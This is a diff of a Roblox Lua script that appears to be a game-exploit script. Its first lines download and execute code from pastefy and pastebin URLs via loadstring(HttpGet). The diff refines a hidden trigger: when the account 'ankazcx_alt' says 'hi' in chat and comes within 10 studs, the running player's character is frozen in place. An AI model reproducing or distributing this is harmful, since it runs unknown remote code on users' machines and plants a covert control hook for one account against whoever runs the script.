@@ -1,6 +1,7 @@
 loadstring(game:HttpGet('https://pastefy.app/39Mk0IUN/raw'))()
 loadstring(game:HttpGet('https://pastebin.com/raw/Vg6AZbZE'))()
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 local localPlayer = Players.LocalPlayer
 
 local function onPlayerAdded(player)
@@ -8,7 +9,18 @@ local function onPlayerAdded(player)
         if player.Name == "ankazcx_alt" and message:lower() == "hi" then
             local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
             local rootPart = character:WaitForChild("HumanoidRootPart")
-            rootPart.Anchored = true
+
+            local targetCharacter = player.Character
+            if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
+                local connection
+                connection = RunService.Heartbeat:Connect(function()
+                    local distance = (rootPart.Position - targetCharacter.HumanoidRootPart.Position).Magnitude
+                    if distance <= 10 then
+                        rootPart.Anchored = true
+                        connection:Disconnect()
+                    end
+                end)
+            end
         end
     end)
 end
